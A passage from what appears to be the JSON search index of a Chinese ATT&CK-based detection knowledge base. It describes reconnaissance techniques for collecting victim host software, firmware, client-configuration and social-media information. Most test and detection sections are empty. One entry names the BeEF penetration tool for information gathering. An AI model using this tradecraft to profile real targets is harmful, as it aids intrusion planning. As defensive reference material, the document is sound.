751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF/#_7","text":"MITRE-ATT&CK-T1592-002 https://attack.mitre.org/techniques/T1592/002/ \u6307\u7eb9\u8bc6\u522b\u5927\u5168 https://www.bilibili.com/read/cv9136494/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%9B%BA%E4%BB%B6%E4%BF%A1%E6%81%AF/","text":"T1592-003-\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f-\u56fa\u4ef6\u4fe1\u606f \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u6709\u5173\u53d7\u5bb3\u8005\u4e3b\u673a\u56fa\u4ef6\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u76ee\u6807\u5b9a\u4f4d\u671f\u95f4\u4f7f\u7528\u3002\u6709\u5173\u4e3b\u673a\u56fa\u4ef6\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u4f8b\u5982\u7279\u5b9a\u4e3b\u673a\u4e0a\u7684\u7c7b\u578b\u548c\u7248\u672c\uff0c\u8fd9\u53ef\u4ee5\u7528\u6765\u63a8\u6d4b\u51fa\u66f4\u591a\u76ee\u6807\u73af\u5883\u4e2d\u4e3b\u673a\u7684\u4fe1\u606f\uff08\u4f8b\u5982\uff1a\u914d\u7f6e\uff0c\u7528\u9014\uff0c\u4f7f\u7528\u671f\u9650/\u8865\u4e01\u7ea7\u522b\u7b49\uff09\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u7f51\u7edc\u9493\u9c7c\u6536\u96c6\u3002\u6709\u5173\u56fa\u4ef6\u7684\u4fe1\u606f\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u804c\u4f4d\u53d1\u5e03\uff0c\u7f51\u7edc\u5730\u56fe\uff0c\u8bc4\u4f30\u62a5\u544a\uff0c\u5c65\u5386\u8868\u6216\u8d2d\u4e70\u53d1\u7968\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u8005\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u53d6\u80fd\u529b\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u4f9b\u5e94\u94fe\u653b\u9677\u6216\u9762\u5411\u516c\u4f17\u5e94\u7528\u7684\u6f0f\u6d1e\u5229\u7528\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u65e0 \u68c0\u6d4b\u65e5\u5fd7 \u65e0 \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1592-003 https://attack.mitre.org/techniques/T1592/003/","title":"T1592-003-\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f-\u56fa\u4ef6\u4fe1\u606f"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%9B%BA%E4%BB%B6%E4%BF%A1%E6%81%AF/#t1592-003-","text":"","title":"T1592-003-\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f-\u56fa\u4ef6\u4fe1\u606f"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%9B%BA%E4%BB%B6%E4%BF%A1%E6%81%AF/#attck","text":"\u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u6709\u5173\u53d7\u5bb3\u8005\u4e3b\u673a\u56fa\u4ef6\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u76ee\u6807\u5b9a\u4f4d\u671f\u95f4\u4f7f\u7528\u3002\u6709\u5173\u4e3b\u673a\u56fa\u4ef6\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u4f8b\u5982\u7279\u5b9a\u4e3b\u673a\u4e0a\u7684\u7c7b\u578b\u548c\u7248\u672c\uff0c\u8fd9\u53ef\u4ee5\u7528\u6765\u63a8\u6d4b\u51fa\u66f4\u591a\u76ee\u6807\u73af\u5883\u4e2d\u4e3b\u673a\u7684\u4fe1\u606f\uff08\u4f8b\u5982\uff1a\u914d\u7f6e\uff0c\u7528\u9014\uff0c\u4f7f\u7528\u671f\u9650/\u8865\u4e01\u7ea7\u522b\u7b49\uff09\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u7f51\u7edc\u9493\u9c7c\u6536\u96c6\u3002\u6709\u5173\u56fa\u4ef6\u7684\u4fe1\u606f\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u804c\u4f4d\u53d1\u5e03\uff0c\u7f51\u7edc\u5730\u56fe\uff0c\u8bc4\u4f30\u62a5\u544a\uff0c\u5c65\u5386\u8868\u6216\u8d2d\u4e70\u53d1\u7968\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u8005\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u53d6\u80fd\u529b\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u4f9b\u5e94\u94fe\u653b\u9677\u6216\u9762\u5411\u516c\u4f17\u5e94\u7528\u7684\u6f0f\u6d1e\u5229\u7528\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%9B%BA%E4%BB%B6%E4%BF%A1%E6%81%AF/#_1","text":"\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%9B%BA%E4%BB%B6%E4%BF%A1%E6%81%AF/#_2","text":"\u65e0","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%9B%BA%E4%BB%B6%E4%BF%A1%E6%81%AF/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%9B%BA%E4%BB%B6%E4%BF%A1%E6%81%AF/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%9B%BA%E4%BB%B6%E4%BF%A1%E6%81%AF/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%9B%BA%E4%BB%B6%E4%BF%A1%E6%81%AF/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%9B%BA%E4%BB%B6%E4%BF%A1%E6%81%AF/#_7","text":"MITRE-ATT&CK-T1592-003 https://attack.mitre.org/techniques/T1592/003/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE/","text":"T1592-004-\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f-\u5ba2\u6237\u7aef\u914d\u7f6e \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u6709\u5173\u53d7\u5bb3\u8005\u7684\u5ba2\u6237\u7aef\u914d\u7f6e\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u76ee\u6807\u5b9a\u4f4d\u671f\u95f4\u4f7f\u7528\u3002\u6709\u5173\u5ba2\u6237\u7aef\u914d\u7f6e\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\u548c\u8bbe\u7f6e\uff0c\u5305\u62ec\u64cd\u4f5c\u7cfb\u7edf/\u7248\u672c\uff0c\u865a\u62df\u5316\uff0c\u4f53\u7cfb\u7ed3\u6784\uff08\u4f8b\u5982\uff1a32\u4f4d\u621664\u4f4d\uff09\uff0c\u8bed\u8a00\u6216\u65f6\u533a\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u4e3b\u52a8\u626b\u63cf\uff08\u4f8b\u5982\uff1a\u4e3b\u673a\u540d\uff0c\u670d\u52a1\u5668\u65d7\u6807\uff0c\u7528\u6237\u4ee3\u7406\u5b57\u7b26\u4e32\uff09\u3001 \u9493\u9c7c\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u5165\u4fb5\u7ad9\u70b9\uff0c\u7136\u540e\u690d\u5165\u65e8\u5728\u6536\u96c6\u8bbf\u95ee\u8005\u5ba2\u6237\u7aef\u914d\u7f6e\u4fe1\u606f\u7684\u6076\u610f\u5185\u5bb9\u3002\u6709\u5173\u786c\u4ef6\u57fa\u7840\u8bbe\u65bd\u7684\u4fe1\u606f\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u804c\u4f4d\u53d1\u5e03\uff0c\u7f51\u7edc\u5730\u56fe\uff0c\u8bc4\u4f30\u62a5\u544a\uff0c\u5c65\u5386\u8868\u6216\u8d2d\u4e70\u53d1\u7968\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u63d0\u4f9b\u53ef\u80fd\u6027\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\uff0c\u6216\u8005\u641c\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u53d6\u80fd\u529b\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u4f9b\u5e94\u94fe\u653b\u9677\u6216\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b beef-\u4fe1\u606f\u6536\u96c6 \u68c0\u6d4b\u65e5\u5fd7 \u65e0 \u6d4b\u8bd5\u590d\u73b0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1592-004 https://attack.mitre.org/techniques/T1592/004/ beef-\u6e17\u900f\u5de5\u5177\u4f7f\u7528\u6307\u5357 https://www.kancloud.cn/wintry/p-tools/598539","title":"T1592-004-\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f-\u5ba2\u6237\u7aef\u914d\u7f6e"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE/#t1592-004-","text":"","title":"T1592-004-\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f-\u5ba2\u6237\u7aef\u914d\u7f6e"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE/#attck","text":"\u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u6709\u5173\u53d7\u5bb3\u8005\u7684\u5ba2\u6237\u7aef\u914d\u7f6e\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u76ee\u6807\u5b9a\u4f4d\u671f\u95f4\u4f7f\u7528\u3002\u6709\u5173\u5ba2\u6237\u7aef\u914d\u7f6e\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\u548c\u8bbe\u7f6e\uff0c\u5305\u62ec\u64cd\u4f5c\u7cfb\u7edf/\u7248\u672c\uff0c\u865a\u62df\u5316\uff0c\u4f53\u7cfb\u7ed3\u6784\uff08\u4f8b\u5982\uff1a32\u4f4d\u621664\u4f4d\uff09\uff0c\u8bed\u8a00\u6216\u65f6\u533a\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u4e3b\u52a8\u626b\u63cf\uff08\u4f8b\u5982\uff1a\u4e3b\u673a\u540d\uff0c\u670d\u52a1\u5668\u65d7\u6807\uff0c\u7528\u6237\u4ee3\u7406\u5b57\u7b26\u4e32\uff09\u3001 \u9493\u9c7c\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u5165\u4fb5\u7ad9\u70b9\uff0c\u7136\u540e\u690d\u5165\u65e8\u5728\u6536\u96c6\u8bbf\u95ee\u8005\u5ba2\u6237\u7aef\u914d\u7f6e\u4fe1\u606f\u7684\u6076\u610f\u5185\u5bb9\u3002\u6709\u5173\u786c\u4ef6\u57fa\u7840\u8bbe\u65bd\u7684\u4fe1\u606f\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u804c\u4f4d\u53d1\u5e03\uff0c\u7f51\u7edc\u5730\u56fe\uff0c\u8bc4\u4f30\u62a5\u544a\uff0c\u5c65\u5386\u8868\u6216\u8d2d\u4e70\u53d1\u7968\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u63d0\u4f9b\u53ef\u80fd\u6027\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\uff0c\u6216\u8005\u641c\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u53d6\u80fd\u529b\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u4f9b\u5e94\u94fe\u653b\u9677\u6216\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE/#_1","text":"beef-\u4fe1\u606f\u6536\u96c6","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE/#_2","text":"\u65e0","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE/#_7","text":"MITRE-ATT&CK-T1592-004 https://attack.mitre.org/techniques/T1592/004/ beef-\u6e17\u900f\u5de5\u5177\u4f7f\u7528\u6307\u5357 https://www.kancloud.cn/wintry/p-tools/598539","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93/","text":"T1593-001-\u641c\u7d22\u5f00\u653e\u7684\u57df/\u7f51\u7ad9-\u793e\u4ea4\u5a92\u4f53 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u793e\u4ea4\u5a92\u4f53\u4e0a\u641c\u7d22\u6709\u5173\u53d7\u5bb3\u8005\u7684\u4fe1\u606f\uff0c\u4ee5\u4fbf\u5728\u9501\u5b9a\u76ee\u6807\u65f6\u4f7f\u7528\u3002\u793e\u4ea4\u5a92\u4f53\u7f51\u7ad9\u53ef\u80fd\u5305\u542b\u6709\u5173\u53d7\u5bb3\u8005\u7ec4\u7ec7\u7684\u5404\u79cd\u4fe1\u606f\uff0c\u5982\u4e1a\u52a1\u516c\u544a\u4ee5\u53ca\u6709\u5173\u5de5\u4f5c\u4eba\u5458\u7684\u89d2\u8272\u3001\u5730\u70b9\u548c\u5174\u8da3\u7684\u4fe1\u606f\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6839\u636e\u4ed6\u4eec\u60f3\u8981\u6536\u96c6\u7684\u4fe1\u606f\uff0c\u5728\u4e0d\u540c\u7684\u793e\u4ea4\u5a92\u4f53\u7f51\u7ad9\u4e0a\u8fdb\u884c\u641c\u7d22\u3002\u5a01\u80c1\u8005\u53ef\u80fd\u4f1a\u88ab\u52a8\u5730\u4ece\u8fd9\u4e9b\u7f51\u7ad9\u4e0a\u6536\u96c6\u6570\u636e\uff0c\u4ee5\u53ca\u5229\u7528\u6536\u96c6\u5230\u7684\u4fe1\u606f\u521b\u5efa\u865a\u5047\u7684\u4e2a\u4eba\u8d44\u6599/\u7fa4\u7ec4\uff0c\u4ee5\u8bf1\u4f7f\u53d7\u5bb3\u8005\u900f\u9732\u7279\u5b9a\u7684\u4fe1\u606f\uff08\u5373\u9c7c\u53c9\u5f0f\u9493\u9c7c\u670d\u52a1\uff09\u3002\u6765\u81ea\u8fd9\u4e9b\u6765\u6e90\u7684\u4fe1\u606f\u53ef\u80fd\u4e3a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\uff08\u4f8b\u5982\uff1a\u4fe1\u606f\u9493\u9c7c\u6216\u641c\u7d22\u5f00\u653e\u5f0f\u6280\u672f\u6570\u636e\u5e93\uff09\u3001\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5efa\u7acb\u8d26\u6237\u6216\u7834\u574f\u8d26\u6237\uff09\u6216\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u901a\u8fc7\u670d\u52a1\u9c7c\u53c9\u5f0f\u9493\u9c7c\uff09\u63d0\u4f9b\u673a\u4f1a\u3002 